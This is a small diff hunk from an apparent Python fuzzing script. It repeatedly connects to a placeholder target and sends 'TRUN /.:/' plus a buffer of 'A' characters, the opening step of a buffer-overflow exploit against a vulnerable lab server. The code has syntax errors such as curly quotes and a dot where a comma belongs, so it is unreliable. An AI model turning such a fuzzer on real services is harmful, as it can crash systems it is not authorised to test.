@@ -8,7 +8,7 @@ buffer = “A” * 100
 while True:
     try:
         s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)
-        s.connect((‘{target ip}’ , ‘{target port} ))
+        s.connect((‘{target ip}’ , ‘{target port}' ))
 
         s.send((‘ TRUN /.:/ ‘ + buffer))
         s.close
